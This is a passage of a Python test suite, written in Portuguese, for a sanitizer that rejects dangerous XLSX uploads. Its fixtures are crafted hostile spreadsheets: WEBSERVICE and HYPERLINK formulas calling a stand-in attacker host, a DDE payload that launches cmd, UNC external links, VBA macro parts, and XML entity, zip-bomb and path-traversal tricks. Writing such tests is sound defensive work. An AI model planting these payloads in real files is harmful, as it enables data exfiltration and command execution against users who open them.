                "macro=\"\" textlink=\"'\\\\atacante\\pasta\\[x.xlsx]Aba'!$A$1\""), sanitizacao.MOTIVO_FORMULA),
            "macro numa forma": (com_forma('macro="[1]!Macro1" textlink=""'), sanitizacao.MOTIVO_CONTEUDO_ATIVO),
            "publicação na web na pasta de trabalho": (xlsx(partes={"xl/workbook.xml": (
                f'<workbook xmlns="{principal}" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/'
                'relationships"><sheets><sheet name="Vendas" sheetId="1" r:id="rId1"/></sheets>'
                '<webPublishObjects count="1"><webPublishObject id="1" divId="Vendas_1" sourceObject="Vendas!A1:B2" '
                'destinationFile="\\\\atacante\\pasta\\v.htm" autoRepublish="1"/></webPublishObjects></workbook>')}),
                sanitizacao.MOTIVO_CONTEUDO_ATIVO),
        }
        for rotulo, (conteudo, motivo) in perigosos.items():
            with self.subTest(caso=rotulo):
                self.assertEqual(sanitizacao.conferir_xlsx(conteudo), motivo)
        # O cfvo de número, a forma sem macro e com o texto ligado a uma célula da própria pasta, e o escape de um
        # caractere comum passam.
        for rotulo, conteudo in (("cfvo de número", com_cfvo("50")),
                                 ("forma comum", com_forma('macro="" textlink="$A$1"')),
                                 ("escape inofensivo", com_formula('"_x0041_"&amp;B1'))):
            with self.subTest(caso=rotulo):
                self.assertIsNone(sanitizacao.conferir_xlsx(conteudo))

    def test_tipo_de_conteudo_nao_tira_uma_aba_da_leitura(self):
        # Declarar a aba como imagem a deixaria sem leitura aqui, e o Excel a abriria como aba (o papel vem da
        # relação). O Override de outro namespace é ignorado, como no Excel; o repetido (também com %HH) recusa o
        # pacote; e o tipo tem de ser o do papel que a relação dá à parte.
        perigosa = folha('<c r="A1"><f>HYPERLINK("http://atacante.exemplo","x")</f></c>')
        tipos = "http://schemas.openxmlformats.org/package/2006/content-types"
        base = ('<?xml version="1.0"?><Types xmlns="' + tipos + '">'
                '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
                f'<Override PartName="/xl/workbook.xml" ContentType="{PRINCIPAL}"/>')
        aba = f'<Override PartName="/xl/worksheets/sheet1.xml" ContentType="{TIPO_DA_ABA}"/>'
        casos = {
            "Override de outro namespace": (base + aba + '<ns:Override xmlns:ns="urn:x" '
                                            'PartName="/xl/worksheets/sheet1.xml" ContentType="image/png"/></Types>',
                                            sanitizacao.MOTIVO_FORMULA),
            "Override repetido": (base + aba + '<Override PartName="/xl/worksheets/sheet1.xml" '
                                               'ContentType="image/png"/></Types>', sanitizacao.MOTIVO_NAO_E_XLSX),
            "Override repetido com %HH": (base + aba + '<Override PartName="/xl/worksheets/%73heet1.xml" '
                                                       'ContentType="image/png"/></Types>',
                                          sanitizacao.MOTIVO_NAO_E_XLSX),
            "aba pelo padrão das imagens": (base + '<Default Extension="xml" ContentType="image/png"/></Types>',
                                            sanitizacao.MOTIVO_TIPO_TROCADO),
        }
        for rotulo, (content_types, motivo) in casos.items():
            with self.subTest(caso=rotulo):
                self.assertEqual(sanitizacao.conferir_xlsx(xlsx(planilha=perigosa, content_types=content_types)),
                                 motivo)

    def test_alvo_da_relacao_resolvido_como_o_opc(self):
        # A aba declarada como imagem, apontada por um alvo que só depois de resolvido (RFC 3986) chega a ela: o
        # papel da relação continua conferido. E a relação de dados que não cai em parte nenhuma recusa o pacote.
        perigosa = folha('<c r="A1"><f>_xlfn.WEBSERVICE("http://atacante.exemplo/x")</f></c>')
        tipos = "http://schemas.openxmlformats.org/package/2006/content-types"
        como_imagem = ('<?xml version="1.0"?><Types xmlns="' + tipos + '">'
                       '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
                       f'<Override PartName="/xl/workbook.xml" ContentType="{PRINCIPAL}"/>'
                       '<Override PartName="/xl/worksheets/sheet1.xml" ContentType="image/png"/></Types>')
        rels = ('<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/'
                'relationships"><Relationship Id="rId1" Type="' + RELACAO + 'worksheet" Target="{alvo}"/>'
                '</Relationships>')
        for alvo in ("/../xl/worksheets/sheet1.xml", "worksheets/%2E/sheet1.xml", "worksheets\\sheet1.xml",
                     "worksheets/sheet1.xml#x", "worksheets/sheet1.xml?x=1", "worksheets/sheet1.xml ",
                     "../xl/worksheets/./sheet1.xml", "WORKSHEETS/Sheet1.xml"):
            with self.subTest(alvo=alvo):
                conteudo = xlsx(planilha=perigosa, content_types=como_imagem,
                                partes={"xl/_rels/workbook.xml.rels": rels.format(alvo=alvo)})
                self.assertEqual(sanitizacao.conferir_xlsx(conteudo), sanitizacao.MOTIVO_TIPO_TROCADO)
        for alvo in ("worksheets/nao-existe.xml", "../../fora.xml/../../x.xml"):
            with self.subTest(alvo=alvo):
                conteudo = xlsx(partes={"xl/_rels/workbook.xml.rels": rels.format(alvo=alvo)})
                self.assertEqual(sanitizacao.conferir_xlsx(conteudo), sanitizacao.MOTIVO_NAO_E_XLSX)
        # A parte do ZIP com o segmento "." no nome.
        self.assertEqual(sanitizacao.conferir_xlsx(xlsx(extras={"xl/./media/x.xml": "<a/>"})),
                         "A planilha tem caminhos internos inválidos.")

    def test_entradas_demais_nos_tipos_e_nas_relacoes(self):
        # Milhões de Override ou de Relationship passariam por todas as travas de estrutura e ficariam guardados.
        tipos = "http://schemas.openxmlformats.org/package/2006/content-types"
        sobras = "".join(f'<Override PartName="/xl/x{indice}.xml" ContentType="{TIPO_DA_ABA}"/>'
                         for indice in range(12_000))
        muitos_tipos = ('<?xml version="1.0"?><Types xmlns="' + tipos + '">'
                        '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
                        f'<Override PartName="/xl/workbook.xml" ContentType="{PRINCIPAL}"/>'
                        f'<Override PartName="/xl/worksheets/sheet1.xml" ContentType="{TIPO_DA_ABA}"/>{sobras}</Types>')
        self.assertEqual(sanitizacao.conferir_xlsx(xlsx(content_types=muitos_tipos)), sanitizacao.MOTIVO_ESTRUTURA)
        muitas_relacoes = "".join(relacao(f"rId{indice}", "worksheet", "worksheets/sheet1.xml")
                                  for indice in range(2, 12_002))
        self.assertEqual(sanitizacao.conferir_xlsx(xlsx(relacoes=muitas_relacoes)), sanitizacao.MOTIVO_ESTRUTURA)

    def test_hiperlink_para_outra_aba_do_proprio_arquivo_passa(self):
        # O openpyxl grava o link para outra aba como relação externa com o alvo #Aba!A1.
        def com_hiperlink(alvo):
            return xlsx(planilha=folha(depois='<hyperlinks><hyperlink ref="A1" r:id="rId1" xmlns:r="urn:r"/>'
                                              '</hyperlinks>'),
                        extras={"xl/worksheets/_rels/sheet1.xml.rels": (
                            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
                            + relacao("rId1", "hyperlink", alvo, externa=True) + "</Relationships>")})
        for alvo in ("#Detalhe!A1", "#'Outra aba'!B2:C3", "#Total"):
            with self.subTest(alvo=alvo):
                self.assertIsNone(sanitizacao.conferir_xlsx(com_hiperlink(alvo)))
        for alvo in ("http://atacante.exemplo", "#'\\\\atacante\\pasta\\[x.xlsx]Aba'!A1", "#[x.xlsx]Aba!A1",
                     "#Livro.xlsx!Nome", "file:///c:/x.xlsx"):
            with self.subTest(alvo=alvo):
                self.assertEqual(sanitizacao.conferir_xlsx(com_hiperlink(alvo)),
                                 "A planilha tem vínculos com outros arquivos ou endereços.")

    def test_estrutura_xml_fora_do_padrao_e_recusada_cedo(self):
        # A memória do expat cresce com o aninhamento, com os nomes distintos e com a marcação incompleta; o
        # conteúdo de ruído não comprime 100 vezes (não é bomba) e passa pelas travas do ZIP.
        ruido = "".join(hashlib.sha256(str(indice).encode()).hexdigest() for indice in range(40_000))  # 2,5 MB
        aninhado = "<a><b><c><d>" * 10_000
        casos = {
            "aninhamento na aba": xlsx(planilha=folha().replace("<sheetData>", "<sheetData>" + aninhado)),
            "nomes distintos": xlsx(planilha=folha(depois="".join(f"<n{indice}/>" for indice in range(3_000)))),
            # Poucos nomes, mas enormes: o tamanho somado conta, não só a quantidade.
            "nome de 300 KB": xlsx(planilha=folha(depois=f"<n{ruido[:300_000]}/>")),
            "comentário de 2,5 MB": xlsx(planilha=folha(depois=f"<!--{ruido}-->")),
            "atributo de 2,5 MB": xlsx(planilha=folha().replace("<sheetData>",
                                                                f'<sheetPr codeName="{ruido}"/><sheetData>')),
            "aninhamento nos tipos": xlsx(content_types=(
                '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
                + aninhado)),
            "aninhamento nas relações": xlsx(relacoes=aninhado),
        }
        for rotulo, conteudo in casos.items():
            with self.subTest(caso=rotulo):
                inicio = time.perf_counter()
                self.assertEqual(sanitizacao.conferir_xlsx(conteudo), sanitizacao.MOTIVO_ESTRUTURA)
                self.assertLess(time.perf_counter() - inicio, 10)

    def test_formula_escondida_pela_codificacao_do_xml(self):
        principal = "http://schemas.openxmlformats.org/spreadsheetml/2006/main"
        utf16 = ('<?xml version="1.0" encoding="UTF-16" standalone="yes"?>'
                 f'<worksheet xmlns="{principal}"><sheetData><row r="1"><c r="A1"><f>{HYPERLINK}</f></c></row>'
                 '</sheetData></worksheet>').encode("utf-16")
        casos = {
            "entidade na letra": com_formula('&#x48;YPERLINK("http://atacante.exemplo","x")'),
            "entidade no parêntese": com_formula('HYPERLINK&#40;"http://atacante.exemplo","x")'),
            "entidade na barra do DDE": com_formula("cmd&#124;' /C calc'!A0"),
            "CDATA": com_formula(f"<![CDATA[{HYPERLINK}]]>"),
            "prefixo de namespace": xlsx(planilha=(
                f'<?xml version="1.0" encoding="UTF-8"?><x:worksheet xmlns:x="{principal}"><x:sheetData>'
                f'<x:row r="1"><x:c r="A1"><x:f>{HYPERLINK}</x:f></x:c></x:row></x:sheetData></x:worksheet>')),
            "aba em UTF-16": xlsx(planilha=utf16),
        }
        for rotulo, conteudo in casos.items():
            with self.subTest(caso=rotulo):
                self.assertEqual(sanitizacao.conferir_xlsx(conteudo), sanitizacao.MOTIVO_FORMULA)

    def test_formula_fora_das_celulas_e_fora_da_pasta_das_abas(self):
        casos = {
            "nome definido": xlsx(nomes_definidos=f'<definedName name="vazar">{WEBSERVICE}</definedName>',
                                  planilha=folha('<c r="A1"><f>vazar</f></c>')),
            "formatação condicional": xlsx(planilha=folha(depois=(
                '<conditionalFormatting sqref="A1"><cfRule type="expression" priority="1">'
                f'<formula>LEN({WEBSERVICE})&gt;0</formula></cfRule></conditionalFormatting>'))),
            "validação de dados": xlsx(planilha=folha(depois=(
                '<dataValidations count="1"><dataValidation type="custom" sqref="A1">'
                f'<formula1>{WEBSERVICE}</formula1></dataValidation></dataValidations>'))),
            "aba noutra pasta": xlsx(aba="xl/abas/sheet1.xml", planilha=folha(f'<c r="A1"><f>{HYPERLINK}</f></c>')),
            "extensão x14": xlsx(planilha=folha(depois=(
                '<extLst><ext uri="{78C0D931-6437-407d-A8EE-F0AAD7539E65}" '
                'xmlns:x14="http://schemas.microsoft.com/office/spreadsheetml/2009/9/main">'
                '<x14:conditionalFormattings><x14:conditionalFormatting '
                'xmlns:xm="http://schemas.microsoft.com/office/excel/2006/main"><x14:cfRule type="expression">'
                f'<xm:f>{HYPERLINK}</xm:f></x14:cfRule></x14:conditionalFormatting></x14:conditionalFormattings>'
                '</ext></extLst>'))),
        }
        for rotulo, conteudo in casos.items():
            with self.subTest(caso=rotulo):
                self.assertEqual(sanitizacao.conferir_xlsx(conteudo), sanitizacao.MOTIVO_FORMULA)

    def test_macro_por_qualquer_caminho(self):
        casos = {
            "vbaProject": xlsx(extras={"xl/vbaProject.bin": b"\x00" * 10},
                               tipos=default("bin", "application/vnd.ms-office.vbaProject")),
            "vbaProject renomeado, tipo com entidade": xlsx(
                extras={"xl/dados.bin": b"\xd0\xcf\x11\xe0" + b"\x00" * 10},
                tipos=override("xl/dados.bin", "application/vnd.ms-office.vba&#x50;roject"),
                relacoes=relacao("rId9", "http://schemas.microsoft.com/office/2006/relationships/vbaProject",
                                 "dados.bin")),
            "tipo macroEnabled": xlsx(principal=PRINCIPAL_COM_MACRO),
            "tipo macroEnabled com entidade": xlsx(principal="application/vnd.ms-excel.sheet.macro&#x45;nabled.main+xml"),
            "folha de macro do Excel 4.0 fora da pasta": xlsx(
                extras={"xl/planilhas/macro1.xml": "<xm/>"},
                tipos=override("xl/planilhas/macro1.xml", "application/vnd.ms-excel.macrosheet+xml")),
            "relação de projeto VBA": xlsx(relacoes=relacao(
                "rId9", "http://schemas.microsoft.com/office/2006/relationships/vbaProject", "vbaProject.bin")),
        }
        for rotulo, conteudo in casos.items():
            with self.subTest(caso=rotulo):
                self.assertEqual(sanitizacao.conferir_xlsx(conteudo), sanitizacao.MOTIVO_MACRO)

    def test_conteudo_ativo_pelo_tipo_em_qualquer_caminho(self):
        casos = {
            "ActiveX": ({"xl/activeX/activeX1.xml": "<ax/>"},
                        override("xl/activeX/activeX1.xml", "application/vnd.ms-office.activeX+xml"),
                        "A planilha tem controles ActiveX."),
            "objeto incorporado": ({"xl/embeddings/oleObject1.bin": b"\x00"},
                                   default("bin", "application/vnd.openxmlformats-officedocument.oleObject"),
                                   "A planilha tem objetos incorporados."),
            "vínculo externo renomeado": ({"xl/vinculos/externalLink1.xml": "<externalLink/>"},
                                          override("xl/vinculos/externalLink1.xml", _PLANILHA + "externalLink+xml"),
                                          "A planilha tem vínculos com outros arquivos."),
            "conexão renomeada": ({"xl/conexoes.xml": '<connections><connection id="1"><webPr '
                                                      'url="http://atacante.exemplo"/></connection></connections>'},
                                  override("xl/conexoes.xml", _PLANILHA + "connections+xml"),
                                  "A planilha tem conexões de dados externas."),
            "consulta": ({"xl/queryTables/queryTable1.xml": "<queryTable/>"},
                         override("xl/queryTables/queryTable1.xml", _PLANILHA + "queryTable+xml"),
                         "A planilha tem conexões de dados externas."),
            "comentário antigo (VML)": ({"xl/drawings/vmlDrawing1.vml": "<xml/>"},
                                        default("vml", "application/vnd.openxmlformats-officedocument.vmlDrawing"),
                                        sanitizacao.MOTIVO_CONTEUDO_ATIVO),
            "parte sem tipo próprio": ({"customXml/item1.xml": "<a/>"}, "", sanitizacao.MOTIVO_CONTEUDO_ATIVO),
        }
        for rotulo, (extras, tipos, motivo) in casos.items():
            with self.subTest(caso=rotulo):
                self.assertEqual(sanitizacao.conferir_xlsx(xlsx(extras=extras, tipos=tipos)), motivo)
        # Parte sem tipo nenhum no [Content_Types].xml: não é um pacote válido.
        self.assertEqual(sanitizacao.conferir_xlsx(xlsx(extras={"xl/solto.bin": b"\x00"})),
                         sanitizacao.MOTIVO_NAO_E_XLSX)

    def test_elementos_ativos_e_relacoes_externas(self):
        vinculo = "A planilha tem vínculos com outros arquivos ou endereços."
        casos = {
            "objeto OLE com alvo externo": (xlsx(relacoes=relacao(
                "rId9", "oleObject", "http://atacante.exemplo/objeto", externa=True)), vinculo),
            "hiperlink externo": (xlsx(relacoes=relacao("rId9", "hyperlink", "http://atacante.exemplo", externa=True)),
                                  vinculo),
            "relação de dados com alvo externo": (xlsx(relacoes=relacao(
                "rId9", "worksheet", "http://atacante.exemplo/aba.xml", externa=True)), vinculo),
            "objeto OLE interno": (xlsx(relacoes=relacao("rId9", "oleObject", "embeddings/o.bin")),
                                   "A planilha tem objetos incorporados."),
            "elemento oleObject na aba": (xlsx(planilha=folha(depois='<oleObjects><oleObject progId="Package" '
                                                                     'r:id="rId1" xmlns:r="urn:r"/></oleObjects>')),
                                          sanitizacao.MOTIVO_CONTEUDO_ATIVO),
            "ddeLink com outro prefixo": (xlsx(planilha=folha(depois='<d:ddeLink xmlns:d="urn:qualquer" '
                                                                     'ddeService="cmd" ddeTopic="/C calc"/>')),
                                          sanitizacao.MOTIVO_CONTEUDO_ATIVO),
        }
        for rotulo, (conteudo, motivo) in casos.items():
            with self.subTest(caso=rotulo):
                self.assertEqual(sanitizacao.conferir_xlsx(conteudo), motivo)

    def test_doctype_cifrada_e_nao_planilha(self):
        doctype = '<?xml version="1.0"?><!DOCTYPE lol [<!ENTITY a "a">]>'
        bomba_xml = folha().replace('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>', doctype)
        self.assertEqual(sanitizacao.conferir_xlsx(xlsx(planilha=bomba_xml)), sanitizacao.MOTIVO_XML)
        # DOCTYPE depois de um comentário longo no prólogo: a parte é lida inteira.
        tardio = folha().replace('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>',
                                 '<?xml version="1.0"?><!--' + "x" * 6000 + '--><!DOCTYPE w [<!ENTITY a "a">]>')
        self.assertEqual(sanitizacao.conferir_xlsx(xlsx(planilha=tardio)), sanitizacao.MOTIVO_XML)
        self.assertIsNotNone(sanitizacao.conferir_xlsx(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 600))
        self.assertEqual(sanitizacao.conferir_xlsx(b"Codigo;Produto\n"), sanitizacao.MOTIVO_NAO_E_XLSX)
        self.assertEqual(sanitizacao.conferir_xlsx(xlsx(principal=PRINCIPAL_DE_MODELO)),
                         sanitizacao.MOTIVO_NAO_E_XLSX)
        # A pasta de trabalho tem de ser o alvo da relação officeDocument, com o tipo de planilha.
        self.assertEqual(sanitizacao.conferir_xlsx(xlsx(principal=TIPO_DA_ABA)), sanitizacao.MOTIVO_NAO_E_XLSX)
        # O tipo de planilha só num comentário do [Content_Types].xml não basta.
        so_no_comentario = ('<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/'
                            f'content-types"><!-- {PRINCIPAL} --><Default Extension="xml" ContentType="{TIPO_DA_ABA}"/>'
                            '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.'
                            'relationships+xml"/></Types>')
        self.assertEqual(sanitizacao.conferir_xlsx(xlsx(content_types=so_no_comentario)),
                         sanitizacao.MOTIVO_NAO_E_XLSX)
        sem_pasta = xlsx(partes={"_rels/.rels": '<Relationships xmlns="http://schemas.openxmlformats.org/package/'
                                                '2006/relationships"/>'})
        self.assertEqual(sanitizacao.conferir_xlsx(sem_pasta), sanitizacao.MOTIVO_NAO_E_XLSX)
        self.assertEqual(sanitizacao.conferir_xlsx(b"PK\x03\x04truncado"), sanitizacao.MOTIVO_NAO_E_XLSX)
        self.assertEqual(sanitizacao.conferir_xlsx(xlsx(planilha="<worksheet><sem fechar>")),
                         sanitizacao.MOTIVO_NAO_E_XLSX)

    def test_zip_cifrado_comprimido_de_outro_jeito_ou_repetido(self):
        cifrado = com_bit_de_cifra(xlsx(), "xl/worksheets/sheet1.xml")
        self.assertEqual(sanitizacao.conferir_xlsx(cifrado), "A planilha tem partes cifradas.")
        self.assertEqual(sanitizacao.conferir_xlsx(xlsx(comprimir=zipfile.ZIP_BZIP2)), sanitizacao.MOTIVO_NAO_E_XLSX)
        with warnings.catch_warnings():
            warnings.simplefilter("ignore")  # o zipfile avisa do nome repetido
            repetido = xlsx(extras={"xl/Workbook.xml": "<workbook/>"})
        self.assertEqual(sanitizacao.conferir_xlsx(repetido), "A planilha tem partes internas repetidas.")

    def test_deflate_corrompido_recusa_sem_excecao(self):
        original = xlsx(planilha=folha('<c r="A1"><v>1</v></c>' * 400))
        inicio = original.index(b"xl/worksheets/sheet1.xml") + len(b"xl/worksheets/sheet1.xml")
        for deslocamento in range(0, 60, 3):
            with self.subTest(deslocamento=deslocamento):
                corrompido = bytearray(original)
                corrompido[inicio + deslocamento] ^= 0xFF
                self.assertIn(sanitizacao.conferir_xlsx(bytes(corrompido)),
                              (sanitizacao.MOTIVO_NAO_E_XLSX, None, "A planilha tem caminhos internos inválidos."))

    def test_xml_hostil_termina_rapido(self):
        casos = {
            "tags sem fechar": folha().replace("<sheetData>", "<sheetData>" + "<f " * 200_000),
            "fórmula enorme": folha(f'<c r="A1"><f>{"A1+" * 20_000}1</f></c>'),
        }
        for rotulo, planilha in casos.items():
            with self.subTest(caso=rotulo):
                inicio = time.perf_counter()
                self.assertIsNotNone(sanitizacao.conferir_xlsx(xlsx(planilha=planilha)))
                self.assertLess(time.perf_counter() - inicio, 5)

    def test_bomba_de_compressao_e_caminho_interno_estranho(self):
        bomba = xlsx(extras={"xl/media/zeros.bin": b"\x00" * (8 * 1024 * 1024)})
        self.assertEqual(sanitizacao.conferir_xlsx(bomba), "A planilha tem compressão suspeita.")
        fuga = xlsx(extras={"../fora.xml": "<a/>"})
        self.assertEqual(sanitizacao.conferir_xlsx(fuga), "A planilha tem caminhos internos inválidos.")
        partes = xlsx(extras={f"xl/media/p{indice}.xml": "<a/>" for indice in range(sanitizacao.LIMITE_DE_PARTES)})
        self.assertEqual(sanitizacao.conferir_xlsx(partes), "A planilha tem partes internas demais.")


if __name__ == "__main__":
    unittest.main()
